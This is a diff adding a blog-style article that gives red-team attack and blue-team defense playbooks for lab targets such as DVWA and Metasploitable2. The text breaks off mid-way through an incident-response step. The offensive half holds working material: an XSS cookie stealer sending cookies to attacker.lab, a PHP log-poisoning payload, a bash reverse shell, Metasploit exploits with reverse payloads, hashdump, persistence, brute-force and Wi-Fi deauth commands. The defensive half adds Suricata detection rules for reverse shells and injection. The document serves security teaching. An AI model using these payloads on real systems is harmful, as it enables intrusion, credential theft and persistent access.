@@ -1,0 +1,1384 @@
+---
+type: article
+title: OpenClaw — Attack & Defense Operations
+tags: [OpenClaw, Arch Linux, Red Team, Blue Team, CTF]
+date: 2026-03-07
+author: Eno
+featuredImage: https://raw.githubusercontent.com/z0rs/z0rs.github.io/refs/heads/master/content/Images/OpenClaw-Attack%26Defense.jpeg
+---
+
+## Arch Linux | Authorized Lab Environments Only
+### Red Team Offensive + Blue Team Defensive Playbooks
+
+> ⚠️ **ETHICAL NOTICE:** Every attack technique in this guide is performed **exclusively** against:
+> - Your own local virtual machines
+> - Docker lab containers (DVWA, Juice Shop, Metasploitable2)
+> - CTF platforms
+> - Systems you own or have **explicit written authorization** to test
+>
+> Using these techniques against unauthorized systems is **illegal** and strictly prohibited.
+
+---
+
+# 🔴 RED TEAM — OFFENSIVE OPERATIONS
+
+---
+
+## PHASE 1 — RECONNAISSANCE
+
+### 1.1 Start Lab Targets First
+
+```bash
+# Start all vulnerable lab containers
+lab-dvwa          # http://localhost:80    (admin/password)
+lab-juiceshop     # http://localhost:3000
+lab-msf2          # http://localhost:8080  (SSH: msfadmin/msfadmin)
+
+# Verify containers are running
+docker ps
+```
+
+### 1.2 Passive Reconnaissance
+
+```bash
+# ── Subdomain Discovery (use on your own domain or lab) ──
+subfinder -d yourtarget.lab -o ~/ai-security-lab/recon/subdomains/results.txt
+amass enum -passive -d yourtarget.lab -o ~/ai-security-lab/recon/domains/amass.txt
+
+# ── DNS Enumeration ──
+dnsx -l ~/ai-security-lab/recon/subdomains/results.txt \
+     -o ~/ai-security-lab/recon/dns/resolved.txt \
+     -resp
+
+# ── HTTP Probing (alive hosts) ──
+httpx -l ~/ai-security-lab/recon/subdomains/results.txt \
+      -title -tech-detect -status-code \
+      -o ~/ai-security-lab/recon/assets/alive.txt
+```
+
+### 1.3 Active Reconnaissance
+
+```bash
+# ── Nmap — Full TCP port scan ──
+sudo nmap -sS -sV -sC -O -p- \
+  --min-rate 1000 --max-retries 2 \
+  -oA ~/ai-security-lab/scans/nmap/full_tcp_$(date +%Y%m%d) \
+  localhost
+
+# ── Nmap — Top 1000 ports (faster) ──
+sudo nmap -sV -sC -T3 \
+  -oN ~/ai-security-lab/scans/nmap/top1000_$(date +%Y%m%d).txt \
+  localhost
+
+# ── Nmap — UDP scan (top 100) ──
+sudo nmap -sU --top-ports 100 \
+  -oN ~/ai-security-lab/scans/nmap/udp_$(date +%Y%m%d).txt \
+  localhost
+
+# ── Masscan — Ultra-fast full port sweep ──
+sudo masscan -p1-65535 127.0.0.1 \
+  --rate=10000 \
+  -oL ~/ai-security-lab/scans/nmap/masscan_$(date +%Y%m%d).txt
+```
+
+### 1.4 Service Fingerprinting
+
+```bash
+# Detailed service/version fingerprinting
+sudo nmap -sV --version-intensity 9 \
+  -p 21,22,23,25,80,443,445,3306,5432,8080,8443 \
+  -oN ~/ai-security-lab/scans/nmap/services.txt \
+  localhost
+
+# Banner grabbing with netcat
+nc -nv localhost 21       # FTP banner
+nc -nv localhost 22       # SSH banner
+nc -nv localhost 80       # HTTP banner
+```
+
+---
+
+## PHASE 2 — ENUMERATION
+
+### 2.1 Web Directory Enumeration
+
+```bash
+# ── Gobuster — Directory brute force ──
+gobuster dir \
+  -u http://localhost \
+  -w ~/ai-security-lab/datasets/wordlists/SecLists/Discovery/Web-Content/common.txt \
+  -x php,html,txt,bak,old,zip \
+  -t 30 \
+  -o ~/ai-security-lab/scans/web-scans/gobuster_dirs.txt
+
+# ── FFUF — Fuzzing with multiple extensions ──
+ffuf -u http://localhost/FUZZ \
+  -w ~/ai-security-lab/datasets/wordlists/SecLists/Discovery/Web-Content/raft-medium-files.txt \
+  -e .php,.txt,.html,.bak \
+  -mc 200,301,302,403 \
+  -o ~/ai-security-lab/scans/web-scans/ffuf_result.json \
+  -of json
+
+# ── FFUF — Virtual host fuzzing ──
+ffuf -u http://localhost \
+  -H "Host: FUZZ.localhost" \
+  -w ~/ai-security-lab/datasets/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt \
+  -mc 200,301,302 \
+  -fs 0
+
+# ── Gobuster — DNS subdomain brute force ──
+gobuster dns \
+  -d yourtarget.lab \
+  -w ~/ai-security-lab/datasets/wordlists/SecLists/Discovery/DNS/namelist.txt \
+  -o ~/ai-security-lab/recon/subdomains/gobuster_dns.txt
+```
+
+### 2.2 SMB / FTP / SSH Enumeration
+
+```bash
+# ── SMB Enumeration (Metasploitable) ──
+nmap --script smb-enum-shares,smb-enum-users,smb-vuln-ms08-067 \
+  -p 445 192.168.56.101
+
+# SMB null session
+smbclient -L //192.168.56.101 -N
+
+# ── FTP Anonymous Login Test ──
+nmap --script ftp-anon,ftp-bounce \
+  -p 21 192.168.56.101
+
+# ── SSH Version & Algorithm Audit ──
+nmap --script ssh2-enum-algos,ssh-hostkey \
+  -p 22 192.168.56.101
+
+# ── Service-specific NSE scripts ──
+nmap --script "mysql-*" -p 3306 192.168.56.101
+nmap --script "http-*" -p 80 192.168.56.101 | \
+  grep -E "VULNERABLE|title|methods"
+```
+
+### 2.3 Nuclei Vulnerability Scan
+
+```bash
+# Full vulnerability scan with Nuclei
+nuclei -u http://localhost \
+  -t ~/nuclei-templates/ \
+  -severity low,medium,high,critical \
+  -rate-limit 50 \
+  -o ~/ai-security-lab/scans/nuclei/full_scan_$(date +%Y%m%d).txt
+
+# Nuclei — OWASP Top 10 templates only
+nuclei -u http://localhost:3000 \
+  -tags owasp \
+  -o ~/ai-security-lab/scans/nuclei/owasp_juiceshop.txt
+
+# Nuclei — CVE scanning
+nuclei -u http://localhost:8080 \
+  -tags cve \
+  -severity high,critical \
+  -o ~/ai-security-lab/scans/nuclei/cves.txt
+
+# Update templates before scanning
+nuclei -update-templates
+```
+
+---
+
+## PHASE 3 — WEB APPLICATION ATTACKS
+
+### 3.1 SQL Injection (SQLMap against DVWA)
+
+```bash
+# Step 1 — Login to DVWA first, get session cookie
+# Browser: http://localhost/login.php
+# Login: admin / password
+# Set Security Level: LOW (Security → low → submit)
+
+# Step 2 — Capture the vulnerable URL
+# Navigate to: http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit
+# Copy your PHPSESSID cookie from browser dev tools
+
+# ── SQLMap — Database enumeration ──
+sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" \
+  --cookie="PHPSESSID=YOUR_SESSION_ID; security=low" \
+  --dbs \
+  --batch \
+  --random-agent \
+  -o \
+  --output-dir=~/ai-security-lab/scans/web-scans/sqlmap/
+
+# ── SQLMap — Table dump ──
+sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" \
+  --cookie="PHPSESSID=YOUR_SESSION_ID; security=low" \
+  -D dvwa --tables \
+  --batch
+
+# ── SQLMap — Dump users table ──
+sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" \
+  --cookie="PHPSESSID=YOUR_SESSION_ID; security=low" \
+  -D dvwa -T users --dump \
+  --batch
+
+# ── SQLMap — POST form injection ──
+sqlmap -u "http://localhost/login.php" \
+  --data="username=admin&password=test&Login=Login" \
+  --dbs --batch
+```
+
+### 3.2 Cross-Site Scripting (XSS)
+
+```bash
+# ── Manual XSS Payloads (in DVWA XSS Reflected page) ──
+# Navigate to: http://localhost/vulnerabilities/xss_r/
+# Test payloads in the "What's your name?" field:
+
+# Basic alert test
+# <script>alert('XSS')</script>
+
+# Cookie stealer
+# <script>document.location='http://attacker.lab/?c='+document.cookie</script>
+
+# Bypass filters
+# <img src=x onerror=alert('XSS')>
+# <svg onload=alert(1)>
+# "><script>alert(1)</script>
+
+# ── FFUF — XSS parameter fuzzing ──
+ffuf -u "http://localhost/vulnerabilities/xss_r/?name=FUZZ" \
+  -w ~/ai-security-lab/datasets/payloads/PayloadsAllTheThings/XSS\ Injection/Intruder/JHADDIX_XSS.txt \
+  -mc 200 \
+  -fr "What's your name"
+
+# ── Nuclei — XSS templates ──
+nuclei -u "http://localhost" \
+  -tags xss \
+  -o ~/ai-security-lab/scans/web-scans/xss_findings.txt
+```
+
+### 3.3 Local File Inclusion (LFI)
+
+```bash
+# ── DVWA LFI page: http://localhost/vulnerabilities/fi/ ──
+# Test in browser or with curl:
+
+# Basic LFI
+curl "http://localhost/vulnerabilities/fi/?page=../../../../etc/passwd"
+
+# LFI with null byte (PHP < 5.3)
+curl "http://localhost/vulnerabilities/fi/?page=../../../../etc/passwd%00"
+
+# LFI — Log poisoning (SSH log)
+# First poison: ssh '<?php system($_GET["cmd"]); ?>'@localhost
+# Then trigger:
+curl "http://localhost/vulnerabilities/fi/?page=../../../../var/log/auth.log&cmd=id"
+
+# ── FFUF — LFI fuzzing ──
+ffuf -u "http://localhost/vulnerabilities/fi/?page=FUZZ" \
+  -w ~/ai-security-lab/datasets/payloads/PayloadsAllTheThings/File\ Inclusion/Intruder/LFI-FuzzerList.txt \
+  -mr "root:x" \
+  -o ~/ai-security-lab/scans/web-scans/lfi_results.txt
+```
+
+### 3.4 Command Injection
+
+```bash
+# ── DVWA Command Injection: http://localhost/vulnerabilities/exec/ ──
+# Test payloads in the IP field:
+
+# Basic command chaining
+# 127.0.0.1; id
+# 127.0.0.1 && whoami
+# 127.0.0.1 | cat /etc/passwd
+
+# Reverse shell via command injection (to your local listener)
+# Start listener first:
+nc -lvnp 4444
+
+# Then inject:
+# 127.0.0.1; bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+
+# ── Nikto — Web server vuln scan ──
+nikto -h http://localhost \
+  -output ~/ai-security-lab/scans/web-scans/nikto_dvwa.txt \
+  -Format txt
+```
+
+### 3.5 OWASP Juice Shop Attacks
+
+```bash
+# ── Nuclei — Juice Shop ──
+nuclei -u http://localhost:3000 \
+  -tags owasp,sqli,xss,lfi \
+  -o ~/ai-security-lab/scans/nuclei/juiceshop_$(date +%Y%m%d).txt
+
+# ── FFUF — API endpoint discovery ──
+ffuf -u http://localhost:3000/api/FUZZ \
+  -w ~/ai-security-lab/datasets/wordlists/SecLists/Discovery/Web-Content/api/objects.txt \
+  -mc 200,201,400,401,403 \
+  -o ~/ai-security-lab/scans/web-scans/juiceshop_api.json \
+  -of json
+
+# ── Admin panel brute force (Juice Shop) ──
+ffuf -u http://localhost:3000/FUZZ \
+  -w ~/ai-security-lab/datasets/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt \
+  -mc 200,301,302 \
+  -t 20
+```
+
+---
+
+## PHASE 4 — NETWORK & SERVICE EXPLOITATION
+
+### 4.1 Metasploit Framework — Metasploitable2
+
+```bash
+# Start Metasploit console
+msfconsole -q
+
+# ─────────────────────────────────────────
+# VSFTPD 2.3.4 Backdoor (Port 21)
+# ─────────────────────────────────────────
+# Inside msfconsole:
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOSTS 192.168.56.101
+set RPORT 21
+run
+
+# ─────────────────────────────────────────
+# Samba usermap_script RCE (Port 445)
+# ─────────────────────────────────────────
+use exploit/multi/samba/usermap_script
+set RHOSTS 192.168.56.101
+set LHOST 192.168.56.1
+set PAYLOAD cmd/unix/reverse_netcat
+run
+
+# ─────────────────────────────────────────
+# UnrealIRCd Backdoor (Port 6667)
+# ─────────────────────────────────────────
+use exploit/unix/irc/unreal_ircd_3281_backdoor
+set RHOSTS 192.168.56.101
+set LHOST 192.168.56.1
+run
+
+# ─────────────────────────────────────────
+# Tomcat Manager Upload (Port 8180)
+# ─────────────────────────────────────────
+use exploit/multi/http/tomcat_mgr_upload
+set RHOSTS 192.168.56.101
+set RPORT 8180
+set HttpUsername tomcat
+set HttpPassword tomcat
+set LHOST 192.168.56.1
+set PAYLOAD java/meterpreter/reverse_tcp
+run
+```
+
+### 4.2 Manual Exploitation
+
+```bash
+# ── FTP Anonymous Login ──
+ftp 192.168.56.101
+# Username: anonymous
+# Password: (blank)
+ls -la
+get sensitive_file.txt
+bye
+
+# ── Telnet (Metasploitable) ──
+telnet 192.168.56.101
+# user: msfadmin / pass: msfadmin
+
+# ── SSH with known creds ──
+ssh msfadmin@192.168.56.101
+
+# ── MySQL unauthorized access ──
+mysql -h 192.168.56.101 -u root
+# (no password on Metasploitable)
+show databases;
+use dvwa;
+select * from users;
+```
+
+---
+
+## PHASE 5 — POST-EXPLOITATION
+
+### 5.1 Meterpreter Post-Exploitation
+
+```bash
+# After getting a Meterpreter session:
+# Inside msfconsole after successful exploit:
+
+sysinfo                    # System information
+getuid                     # Current user
+getsystem                  # Privilege escalation attempt
+hashdump                   # Dump password hashes
+ps                         # Running processes
+shell                      # Drop to system shell
+upload /path/to/tool /tmp/ # Upload file
+download /etc/shadow /tmp/ # Download file
+
+# Persistence
+run persistence -X -i 30 -p 4444 -r 192.168.56.1
+
+# Network pivot
+run post/multi/recon/local_exploit_suggester
+run post/linux/gather/enum_network
+run post/linux/gather/enum_system
+```
+
+### 5.2 Manual Linux Post-Exploitation
+
+```bash
+# ── System enumeration ──
+id && whoami
+uname -a
+cat /etc/os-release
+cat /etc/passwd | grep -v nologin
+cat /etc/shadow             # Requires root
+ss -tlnp
+netstat -rn                 # Routing table
+env                         # Environment variables
+
+# ── SUID binary search (privesc vector) ──
+find / -perm -4000 -type f 2>/dev/null
+
+# ── World-writable files ──
+find / -perm -0002 -type f 2>/dev/null | grep -v proc
+
+# ── Sudo misconfigurations ──
+sudo -l
+
+# ── Cron jobs ──
+cat /etc/crontab
+ls -la /etc/cron*
+crontab -l
+
+# ── Interesting files ──
+find / -name "*.conf" -readable 2>/dev/null | head -20
+find / -name "id_rsa" 2>/dev/null
+find / -name ".bash_history" 2>/dev/null
+
+# ── Network pivoting with SSH tunneling ──
+ssh -L 8888:internal-target:80 user@pivot-host -N
+```
+
+---
+
+## PHASE 6 — PASSWORD ATTACKS
+
+### 6.1 Hydra — Online Brute Force
+
+```bash
+# ── SSH Brute Force (against Metasploitable lab ONLY) ──
+hydra -l msfadmin \
+  -P ~/ai-security-lab/datasets/wordlists/SecLists/Passwords/Common-Credentials/10k-most-common.txt \
+  -t 4 \
+  -o ~/ai-security-lab/scans/web-scans/hydra_ssh.txt \
+  ssh://192.168.56.101
+
+# ── FTP Brute Force ──
+hydra -L ~/ai-security-lab/datasets/wordlists/SecLists/Usernames/top-usernames-shortlist.txt \
+  -P ~/ai-security-lab/datasets/wordlists/SecLists/Passwords/Common-Credentials/best110.txt \
+  -t 8 \
+  ftp://192.168.56.101
+
+# ── HTTP Login Form (DVWA) ──
+hydra -l admin \
+  -P ~/ai-security-lab/datasets/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt \
+  -t 10 \
+  localhost \
+  http-post-form "/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"
+
+# ── HTTP Basic Auth ──
+hydra -l admin \
+  -P ~/ai-security-lab/datasets/wordlists/SecLists/Passwords/Common-Credentials/best110.txt \
+  http-get://192.168.56.101/manager
+```
+
+### 6.2 Offline Password Cracking
+
+```bash
+# ── John the Ripper — Shadow file ──
+# Combine passwd + shadow first
+unshadow /etc/passwd /etc/shadow > /tmp/combined_hashes.txt
+john /tmp/combined_hashes.txt \
+  --wordlist=~/ai-security-lab/datasets/wordlists/SecLists/Passwords/Leaked-Databases/rockyou.txt
+john --show /tmp/combined_hashes.txt
+
+# ── Hashcat — MD5 cracking ──
+# Mode 0 = MD5, -a 0 = dictionary attack
+hashcat -m 0 -a 0 \
+  /tmp/hashes.txt \
+  ~/ai-security-lab/datasets/wordlists/SecLists/Passwords/Leaked-Databases/rockyou.txt \
+  -o /tmp/cracked.txt
+
+# ── Hashcat — NTLM (mode 1000) ──
+hashcat -m 1000 -a 0 \
+  /tmp/ntlm_hashes.txt \
+  ~/ai-security-lab/datasets/wordlists/SecLists/Passwords/Leaked-Databases/rockyou.txt
+
+# ── Hashcat — Rules-based attack ──
+hashcat -m 0 -a 0 \
+  /tmp/hashes.txt \
+  ~/ai-security-lab/datasets/wordlists/SecLists/Passwords/Leaked-Databases/rockyou.txt \
+  -r /usr/share/hashcat/rules/best64.rule
+
+# ── Hashcat — Show cracked ──
+hashcat -m 0 /tmp/hashes.txt --show
+```
+
+---
+
+## PHASE 7 — WIRELESS ATTACKS
+
+> ⚠️ Only on your own Wi-Fi networks in controlled lab environments.
+
+```bash
+# ── Check wireless interfaces ──
+ip link show
+iwconfig
+
+# ── Enable monitor mode ──
+sudo airmon-ng start wlan0
+# Interface becomes wlan0mon
+
+# ── Scan for networks ──
+sudo airodump-ng wlan0mon
+
+# ── Target specific network (WPA2 handshake capture) ──
+sudo airodump-ng -c CHANNEL --bssid TARGET_BSSID \
+  -w ~/ai-security-lab/scans/wireless/capture \
+  wlan0mon
+
+# ── Deauth attack (own AP only) to force handshake ──
+sudo aireplay-ng -0 10 -a TARGET_BSSID wlan0mon
+
+# ── Crack WPA2 handshake ──
+aircrack-ng \
+  -w ~/ai-security-lab/datasets/wordlists/SecLists/Passwords/Leaked-Databases/rockyou.txt \
+  ~/ai-security-lab/scans/wireless/capture-01.cap
+
+# ── Disable monitor mode ──
+sudo airmon-ng stop wlan0mon
+```
+
+---
+---
+
+# 🔵 BLUE TEAM — DEFENSIVE OPERATIONS
+
+---
+
+## DEFENSE 1 — SOC MONITORING & ALERTING
+
+### 1.1 Real-Time Log Monitoring
+
+```bash
+# ── SSH authentication monitoring ──
+sudo journalctl -fu sshd | grep -E --color=always \
+  "Failed password|Invalid user|Accepted|error"
+
+# ── All auth events ──
+sudo journalctl -fu systemd-logind
+
+# ── Kernel security events ──
+sudo journalctl -k -f | grep -i "denied\|blocked\|audit"
+
+# ── Monitor all logs at once (tmux) ──
+tmux new-session -s soc \; \
+  split-window -h "sudo journalctl -fu sshd" \; \
+  split-window -v "sudo journalctl -fu suricata" \; \
+  select-pane -t 0 \; \
+  split-window -v "watch -n 5 'ss -tlnp'"
+```
+
+### 1.2 OSQuery — Host Monitoring
+
+```bash
+# Interactive OSQuery shell
+sudo osqueryi
+
+# ── Detect listening ports ──
+SELECT pid, address, port, protocol FROM listening_ports;
+
+# ── Running processes ──
+SELECT pid, name, cmdline, cwd, username FROM processes;
+
+# ── SUID binaries (privesc detection) ──
+SELECT path, permissions FROM file
+WHERE (permissions LIKE '%s%' OR permissions LIKE '%S%')
+AND path LIKE '/usr/%';
+
+# ── Login history ──
+SELECT username, tty, host, time, pid FROM last LIMIT 20;
+
+# ── Crontab persistence detection ──
+SELECT command, path, source FROM crontab;
+
+# ── Network connections ──
+SELECT pid, remote_address, remote_port, local_port, state
+FROM process_open_sockets
+WHERE remote_address != '' AND remote_address != '127.0.0.1';
+```
+
+### 1.3 OpenClaw SOC Script (Enhanced)
+
+```bash
+cat > ~/ai-security-lab/scripts/automation/openclaw_soc_watch.sh << 'SOCEOF'
+#!/bin/bash
+# OpenClaw — Enhanced SOC Watchdog
+# Detects: SSH brute force, new SUID files, port changes, cron changes
+
+LOG="$HOME/ai-security-lab/logs/soc/watchdog_$(date +%Y%m%d).log"
+ALERT_THRESHOLD=5   # Failed SSH attempts before alert
+
+log_alert() {
+  local level="$1" msg="$2"
+  echo "[$(date '+%Y-%m-%d %H:%M:%S')] [$level] $msg" | tee -a "$LOG"
+}
+
+# Check SSH failures (last 10 min)
+SSH_FAILS=$(journalctl -u sshd --since "10 minutes ago" --no-pager \
+  | grep "Failed password" | wc -l)
+if [[ "$SSH_FAILS" -ge "$ALERT_THRESHOLD" ]]; then
+  ATTACKING_IPS=$(journalctl -u sshd --since "10 minutes ago" --no-pager \
+    | grep "Failed password" \
+    | grep -oE '[0-9]{1,3}(\.[0-9]{1,3}){3}' | sort | uniq -c | sort -rn)
+  log_alert "CRITICAL" "SSH BRUTE FORCE: $SSH_FAILS attempts in 10min"
+  log_alert "CRITICAL" "Source IPs: $ATTACKING_IPS"
+fi
+
+# Check for new SUID files (compare to baseline)
+BASELINE="$HOME/ai-security-lab/logs/soc/suid_baseline.txt"
+CURRENT=$(find /usr /bin /sbin -perm -4000 2>/dev/null | sort)
+if [[ -f "$BASELINE" ]]; then
+  NEW_SUID=$(diff "$BASELINE" <(echo "$CURRENT") | grep "^>" | awk '{print $2}')
+  if [[ -n "$NEW_SUID" ]]; then
+    log_alert "HIGH" "NEW SUID BINARY DETECTED: $NEW_SUID"
+  fi
+else
+  echo "$CURRENT" > "$BASELINE"
+  log_alert "INFO" "SUID baseline created"
+fi
+
+# Check for unexpected listening ports
+KNOWN_PORTS="22 80 443 3000 8080 11434"
+CURRENT_PORTS=$(ss -tlnp | awk 'NR>1 {split($4,a,":"); print a[length(a)]}' | sort -n | uniq)
+for PORT in $CURRENT_PORTS; do
+  if ! echo "$KNOWN_PORTS" | grep -qw "$PORT"; then
+    log_alert "MEDIUM" "UNEXPECTED LISTENING PORT: $PORT"
+  fi
+done
+
+log_alert "INFO" "SOC watchdog cycle complete. SSH fails (10min): $SSH_FAILS"
+SOCEOF
+
+chmod +x ~/ai-security-lab/scripts/automation/openclaw_soc_watch.sh
+
+# Run every 5 minutes via cron
+(crontab -l 2>/dev/null; echo "*/5 * * * * ~/ai-security-lab/scripts/automation/openclaw_soc_watch.sh") | crontab -
+
+echo "alias soc-watch='tail -f ~/ai-security-lab/logs/soc/watchdog_$(date +%Y%m%d).log'" >> ~/.bashrc
+```
+
+---
+
+## DEFENSE 2 — LOG ANALYSIS & FORENSICS
+
+### 2.1 Log Analysis Commands
+
+```bash
+# ── Top attacking IPs (SSH) ──
+sudo journalctl -u sshd --no-pager | \
+  grep "Failed password" | \
+  grep -oE '[0-9]{1,3}(\.[0-9]{1,3}){3}' | \
+  sort | uniq -c | sort -rn | head -20
+
+# ── Unique usernames tried in brute force ──
+sudo journalctl -u sshd --no-pager | \
+  grep "Invalid user" | \
+  awk '{print $8}' | sort | uniq -c | sort -rn | head -20
+
+# ── Successful SSH logins ──
+sudo journalctl -u sshd --no-pager | \
+  grep "Accepted" | \
+  awk '{print $1, $2, $3, $9, $11}'
+
+# ── Sudo command usage audit ──
+sudo journalctl --no-pager | \
+  grep "sudo:" | \
+  grep -v "pam_unix" | \
+  awk '{$1=$2=$3=""; print $0}' | sort | uniq -c | sort -rn
+
+# ── Recent system reboots ──
+last reboot | head -10
+
+# ── Who is currently logged in ──
+who
+w
+
+# ── Login history ──
+last -n 20 | grep -v "^$"
+
+# ── Failed logins history ──
+lastb -n 20 2>/dev/null || sudo lastb -n 20
+
+# ── Web access log analysis (nginx/apache) ──
+# Most requested URLs:
+awk '{print $7}' /var/log/nginx/access.log 2>/dev/null | \
+  sort | uniq -c | sort -rn | head -20
+
+# Most requesting IPs:
+awk '{print $1}' /var/log/nginx/access.log 2>/dev/null | \
+  sort | uniq -c | sort -rn | head -20
+
+# 4xx/5xx error rates:
+awk '$9 ~ /^[45]/' /var/log/nginx/access.log 2>/dev/null | \
+  awk '{print $9}' | sort | uniq -c
+```
+
+### 2.2 Memory Forensics with Volatility3
+
+```bash
+# ── Create memory dump of running process ──
+# (Requires root, for lab VM analysis)
+sudo dd if=/proc/kcore of=~/ai-security-lab/forensics/memory_$(date +%Y%m%d).img bs=1M count=512 2>/dev/null
+
+# ── Volatility3 — Process list ──
+python3 -m volatility3 -f memory.img linux.pslist
+
+# ── Volatility3 — Network connections ──
+python3 -m volatility3 -f memory.img linux.netstat
+
+# ── Volatility3 — Check for injected code ──
+python3 -m volatility3 -f memory.img linux.malfind
+
+# ── File carving with foremost ──
+sudo foremost -i /dev/sda -o ~/ai-security-lab/forensics/carved/ -t jpg,pdf,doc
+
+# ── String analysis ──
+strings suspicious_file | grep -E "http|https|/etc/passwd|bash|sh\b"
+
+# ── Binary file analysis ──
+file suspicious_binary
+objdump -d suspicious_binary | head -100
+readelf -h suspicious_binary
+```
+
+### 2.3 File Integrity Monitoring
+
+```bash
+# ── Create file integrity baseline ──
+cat > ~/ai-security-lab/scripts/automation/fim_baseline.sh << 'FIMEOF'
+#!/bin/bash
+BASELINE_DIR="$HOME/ai-security-lab/logs/soc/fim"
+mkdir -p "$BASELINE_DIR"
+DATE=$(date +%Y%m%d_%H%M%S)
+
+echo "[*] Creating FIM baseline..."
+for DIR in /etc /usr/bin /usr/sbin /bin /sbin; do
+  find "$DIR" -type f -exec sha256sum {} \; 2>/dev/null
+done > "$BASELINE_DIR/baseline_${DATE}.sha256"
+
+echo "[✓] Baseline: $BASELINE_DIR/baseline_${DATE}.sha256"
+FIMEOF
+
+# ── Check against baseline ──
+cat > ~/ai-security-lab/scripts/automation/fim_check.sh << 'FIMCHKEOF'
+#!/bin/bash
+BASELINE_DIR="$HOME/ai-security-lab/logs/soc/fim"
+LATEST=$(ls -t "$BASELINE_DIR"/baseline_*.sha256 2>/dev/null | head -1)
+
+if [[ -z "$LATEST" ]]; then
+  echo "[!] No baseline found. Run fim_baseline.sh first."
+  exit 1
+fi
+
+echo "[*] Verifying against: $LATEST"
+TEMP="/tmp/fim_current_$$.sha256"
+while IFS= read -r line; do
+  FILE=$(echo "$line" | awk '{print $2}')
+  EXPECTED=$(echo "$line" | awk '{print $1}')
+  if [[ -f "$FILE" ]]; then
+    CURRENT=$(sha256sum "$FILE" 2>/dev/null | awk '{print $1}')
+    if [[ "$CURRENT" != "$EXPECTED" ]]; then
+      echo "[CHANGED] $FILE"
+    fi
+  else
+    echo "[MISSING] $FILE"
+  fi
+done < "$LATEST"
+echo "[✓] FIM check complete."
+FIMCHKEOF
+
+chmod +x ~/ai-security-lab/scripts/automation/fim_baseline.sh
+chmod +x ~/ai-security-lab/scripts/automation/fim_check.sh
+echo 'alias fim-baseline="~/ai-security-lab/scripts/automation/fim_baseline.sh"' >> ~/.bashrc
+echo 'alias fim-check="~/ai-security-lab/scripts/automation/fim_check.sh"' >> ~/.bashrc
+```
+
+---
+
+## DEFENSE 3 — INTRUSION DETECTION (SURICATA)
+
+### 3.1 Suricata Configuration
+
+```bash
+# Check Suricata status
+sudo systemctl status suricata
+
+# View Suricata alerts in real-time
+sudo tail -f /var/log/suricata/fast.log
+
+# JSON alert log
+sudo tail -f /var/log/suricata/eve.json | python3 -m json.tool
+
+# Update rules
+sudo suricata-update
+sudo systemctl restart suricata
+
+# Test Suricata config
+sudo suricata -T -c /etc/suricata/suricata.yaml
+```
+
+### 3.2 Custom Suricata Rules
+
+```bash
+# Create custom rules for lab detection
+sudo tee /etc/suricata/rules/openclaw.rules << 'RULES_EOF'
+# OpenClaw Custom Detection Rules
+
+# Detect Nmap SYN scan
+alert tcp any any -> $HOME_NET any (msg:"OPENCLAW Nmap SYN Scan Detected"; \
+  flags:S; threshold:type both, track by_src, count 20, seconds 5; \
+  classtype:attempted-recon; sid:9000001; rev:1;)
+
+# Detect Nmap OS fingerprinting
+alert tcp any any -> $HOME_NET any (msg:"OPENCLAW Nmap OS Fingerprint"; \
+  flags:SFPU; classtype:attempted-recon; sid:9000002; rev:1;)
+
+# Detect SQL injection attempt
+alert http any any -> $HOME_NET 80 (msg:"OPENCLAW SQL Injection Attempt"; \
+  content:"UNION"; nocase; content:"SELECT"; nocase; \
+  classtype:web-application-attack; sid:9000003; rev:1;)
+
+# Detect XSS attempt
+alert http any any -> $HOME_NET 80 (msg:"OPENCLAW XSS Attempt"; \
+  content:"<script"; nocase; \
+  classtype:web-application-attack; sid:9000004; rev:1;)
+
+# Detect SSH brute force
+alert tcp any any -> $HOME_NET 22 (msg:"OPENCLAW SSH Brute Force"; \
+  threshold:type both, track by_src, count 10, seconds 60; \
+  classtype:attempted-user; sid:9000005; rev:1;)
+
+# Detect reverse shell (Netcat)
+alert tcp $HOME_NET any -> any any (msg:"OPENCLAW Outbound Reverse Shell"; \
+  content:"|2f62696e2f7368|"; classtype:trojan-activity; sid:9000006; rev:1;)
+RULES_EOF
+
+# Include custom rules in Suricata config
+sudo grep -q "openclaw.rules" /etc/suricata/suricata.yaml || \
+  sudo sed -i '/rule-files:/a\  - /etc/suricata/rules/openclaw.rules' \
+  /etc/suricata/suricata.yaml
+
+sudo systemctl restart suricata
+echo "[✓] Custom Suricata rules loaded"
+```
+
+### 3.3 Parse Suricata Alerts
+
+```bash
+# Top alert categories
+cat /var/log/suricata/fast.log | \
+  awk -F'\\[\\*\\*\\]' '{print $2}' | \
+  sort | uniq -c | sort -rn | head -20
+
+# Filter by severity
+sudo cat /var/log/suricata/eve.json | \
+  python3 -c "
+import sys, json
+for line in sys.stdin:
+  try:
+    e = json.loads(line)
+    if e.get('event_type') == 'alert':
+      a = e['alert']
+      print(f\"[{a['severity']}] {e['timestamp']} {e.get('src_ip','')} -> {e.get('dest_ip','')}:{e.get('dest_port','')} | {a['signature']}\")
+  except:
+    pass
+" 2>/dev/null | head -50
+```
+
+---
+
+## DEFENSE 4 — INCIDENT RESPONSE
+
+### 4.1 Incident Response Procedure
+
+```bash
+# ══════════════════════════════════════════════════
+# IR STEP 1 — IDENTIFICATION: Confirm the incident
+# ══════════════════════════════════════════════════
+echo "=== INCIDENT RESPONSE INITIATED: $(date) ===" | \
+  tee ~/ai-security-lab/logs/soc/IR_$(date +%Y%m%d_%H%M%S).log
+
+# What's happening?
+who                          # Logged-in users
+w                            # Active sessions
+last -n 10                   # Recent logins
+ps aux --sort=-%cpu | head   # Top CPU processes
+ss -tlnp                     # Listening ports
+ss -tnp                      # Active connections
+
+# ══════════════════════════════════════════════════
+# IR STEP 2 — CONTAINMENT: Isolate the threat
+# ══════════════════════════════════════════════════
+
+# Block suspicious IP immediately
+sudo ufw deny from SUSPICIOUS_IP_HERE
+
+# Kill suspicious process
+sudo kill -9 SUSPICIOUS_PID
+
+# Disable compromised user account
+sudo usermod -L COMPROMISED_USER
+sudo passwd -l COMPROMISED_USER
+
+# ══════════════════════════════════════════════════
+# IR STEP 3 — EVIDENCE COLLECTION
+# ══════════════════════════════════════════════════
+
